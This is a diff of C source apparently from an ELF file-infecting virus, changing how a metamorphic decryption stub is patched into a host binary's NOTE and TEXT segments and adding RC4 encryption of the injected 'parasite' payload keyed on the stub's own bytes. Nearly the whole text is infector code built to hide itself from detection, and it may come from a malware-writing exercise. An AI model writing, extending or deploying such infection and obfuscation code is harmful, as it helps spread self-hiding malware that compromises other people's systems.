@@ -12,7 +12,7 @@ __attribute__((always_inline)) static inline void metamorph_stub(void)
 	const struct s_metamorph metamorph =
 	{
 		{RAX, RDI, RSI, RDX, RCX},
-		{OFFSET_1, OFFSET_2, OFFSET_3, OFFSET_4, OFFSET_5, OFFSET_6, OFFSET_7, OFFSET_8, OFFSET_9, OFFSET_A},
+		{OFFSET_1, OFFSET_2, OFFSET_3, OFFSET_4, OFFSET_5, OFFSET_6, OFFSET_7, OFFSET_8, OFFSET_9},
 	};
 
 	for (register size_t index = 0; index < OFFSET_SIZE; index++)
@@ -30,15 +30,20 @@ __attribute__((always_inline)) static inline void patch_stub(Elf64_Phdr **segmen
 	const size_t size = sizeof(int);
 	const size_t stub_size = (void *)__exit - (void *)L1;
 
-	const size_t patch_address = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (stub_size - (ADDR_OFFSET + JUMP_SIZE)));
-	const size_t patch_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;
+	const size_t stub_addr = ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - stub_size) - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (stub_size - (STUB_OFFSET + JUMP_SIZE)));
+
+	_memcpy(stub + STUB_OFFSET, &stub_addr, size);
+	_memcpy(stub + STUB_SIZE_OFFSET, &stub_size, size);
+
+	const size_t parasite_addr = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (stub_size - (PARASITE_OFFSET + JUMP_SIZE)));
+	const size_t parasite_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;
+
+	_memcpy(stub + PARASITE_OFFSET, &parasite_addr, size);
+	_memcpy(stub + PARASITE_SIZE_OFFSET, &parasite_size, size);
+
 	const size_t patch_jump = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz));
 
-	_memcpy(stub + ADDR_OFFSET, &patch_address, size);
-	_memcpy(stub + SIZE_OFFSET, &patch_size, size);
 	_memcpy(stub + (stub_size - JUMP_SIZE), &patch_jump, size);
-
-	// Need to patch address of stub and size of stub to generate the key;
 }
 
 __attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_Phdr **segment)
@@ -63,10 +68,15 @@ void stub(struct s_host *host, struct s_keychain *keychain, enum e_context conte
 	if (context == FAILURE)
 		goto label;
 
+	const size_t stub_size = (void *)__exit - (void *)L1;
+	const size_t parasite_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;
+
 	metamorph_stub();
 	patch_stub(host->segment);
 	insert_stub(injection->ptr, host->segment);
 
+	RC4((unsigned char *)L1, stub_size, injection->ptr + host->segment[NOTE]->p_offset, parasite_size);
+
 label:
-	key(host, keychain, context, injection);
+	signature(host, keychain, context, injection);
 }
